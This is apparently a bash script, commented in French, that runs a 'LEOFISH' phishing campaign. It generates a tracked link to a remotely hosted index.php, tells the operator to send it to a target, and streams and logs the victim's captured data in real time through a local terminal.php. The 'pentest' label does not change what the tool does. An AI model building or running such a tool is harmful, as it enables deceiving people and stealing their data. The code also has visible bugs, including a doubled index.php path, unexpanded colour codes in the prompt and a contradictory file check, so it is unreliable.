#!/bin/bash

# Couleurs pro
RED='\033[0;31m' GREEN='\033[0;32m' YELLOW='\033[1;33m' BLUE='\033[0;34m' PURPLE='\033[0;35m' CYAN='\033[0;36m' WHITE='\033[1;37m' NC='\033[0m'

# Fichiers
CREDIT_FILE="credit.text"
HELP_FILE="help.text"
SESSION_LOGS="sessions/$(date +%Y%m%d_%H%M%S).log"

# URL Render (CHANGE ÇA)
APP_URL="https://leofish-tool-v1-0.onrender.com/index.php"

# Créer dossier sessions
mkdir -p sessions

show_banner() {
    clear
    echo -e "${CYAN}"
    cat "$CREDIT_FILE"
    echo -e "${NC}"
    echo -e "${WHITE}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}║${YELLOW}                    LEOFISH PENTEST TERMINAL v1.0                    ${WHITE}║${NC}"
    echo -e "${WHITE}║${GREEN}                    Victim → Hacker Monitoring                     ${WHITE}║${NC}"
    echo -e "${WHITE}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}
cat credit.text
# Générer lien + monitoring temps réel
generate_campaign() {
    show_banner
    echo -e "${PURPLE}🎯 NOUVELLE CAMPAGNE PENTEST${NC}"
    echo -e "${YELLOW}Génération du lien de phishing...${NC}"
    
    # ID unique pour cette session
    SESSION_ID=$(date +%s)_$(openssl rand -hex 8 2>/dev/null || echo $RANDOM)
    PHISH_LINK="${APP_URL}/index.php?session=${SESSION_ID}"
    
    # Sauvegarde session
    echo "=== SESSION PENTEST $(date) ===" > "$SESSION_LOGS"
    echo "Lien envoyé: $PHISH_LINK" >> "$SESSION_LOGS"
    
    echo -e "${GREEN}✅ ${WHITE}LIEN GÉNÉRÉ${GREEN} ✅${NC}"
    echo ""
    echo -e "${CYAN}${PHISH_LINK}${NC}"
    echo ""
    echo -e "${YELLOW}📤 Copie ce lien et envoie à la cible${NC}"
    echo -e "${PURPLE}⏳ Attente de l'interaction... (Ctrl+C pour arrêter)${NC}"
    
    read -p $'\nAppuyez sur Entrée pour commencer le monitoring...'
    
    # MONITORING TEMPS RÉEL
    monitor_victim "$SESSION_ID" "$SESSION_LOGS"
}

# Monitoring victim → hacker
monitor_victim() {
    local session_id=$1
    local log_file=$2
    
    clear
    show_banner
    echo -e "${RED}👁️  ${WHITE}MONITORING LIVE - SESSION: ${CYAN}${session_id}${NC}"
    echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
    
    # TAIL -F pour monitoring temps réel de terminal.php
    while true; do
        # Appelle ton terminal.php avec l'ID session
        if [ -f "terminal.php" ]; then
            php terminal.php "$session_id" 2>/dev/null | while IFS= read -r victim_data; do
                if [ -n "$victim_data" ]; then
                    echo -e "${GREEN}[$(date '+%H:%M:%S')]${YELLOW} $victim_data${NC}"
                    echo "$(date '+%H:%M:%S') - $victim_data" >> "$log_file"
                fi
            done
        fi
        
        # Refresh écran
        sleep 1
        clear
        show_banner
        echo -e "${RED}👁️  ${WHITE}MONITORING LIVE - SESSION: ${CYAN}${session_id}${NC}"
        echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
        tail -15 "$log_file"
        echo -e "${BLUE}⏳ En attente de nouvelle activité...${NC}"
    done
}

# Toutes les sessions
show_sessions() {
    show_banner
    echo -e "${YELLOW}📂 TOUTES LES SESSIONS PENTEST${NC}"
    
    if [ ! "$(ls -A sessions 2>/dev/null)" ]; then
        echo -e "${RED}Aucune session${NC}"
    else
        ls -la sessions/ | tail -n +4 | awk '{print $9" "$6" "$7" "$8}'
        echo ""
        read -p "Ouvrir une session (nom fichier): " session_file
        
        if [ -f "sessions/$session_file" ]; then
            echo -e "${BLUE}Contenu de $session_file:${NC}"
            cat "sessions/$session_file" | tail -50
        fi
    fi
    
    read -p $'\nEntrée...'
}

# Help
show_help() {
    show_banner
    cat "$HELP_FILE"
    read -p $'\nEntrée...'
}

# Menu principal
main_menu() {
    while true; do
        show_banner
        
        echo -e "${GREEN}1${NC} ${CYAN}🎣${NC} ${YELLOW}Nouvelle campagne (générer lien + monitor)${NC}"
        echo -e "${GREEN}2${NC} ${CYAN}📂${NC} ${YELLOW}Voir toutes les sessions${NC}"
        echo -e "${GREEN}3${NC} ${CYAN}📖${NC} ${YELLOW}Aide${NC}"
        echo -e "${GREEN}0${NC} ${RED}❌ Quitter${NC}"
        
        read -p $'\n🎯 ${WHITE}HackerAI Pentest >${NC} ' choice
        
        case $choice in
            1) generate_campaign ;;
            2) show_sessions ;;
            3) show_help ;;
            0) echo -e "${GREEN}✅ Session terminée${NC}"; exit 0 ;;
            *) echo -e "${RED}❌ Choix invalide${NC}"; sleep 1 ;;
        esac
    done
}

# Checks
[ ! -f "$CREDIT_FILE" ] && { echo "${RED}credit.text manquant${NC}"; exit 1; }
[ ! -f "terminal.php" ] && echo "${YELLOW}⚠️  terminal.php détecté - assure-toi qu'il retourne les logs${NC}"

main_menu

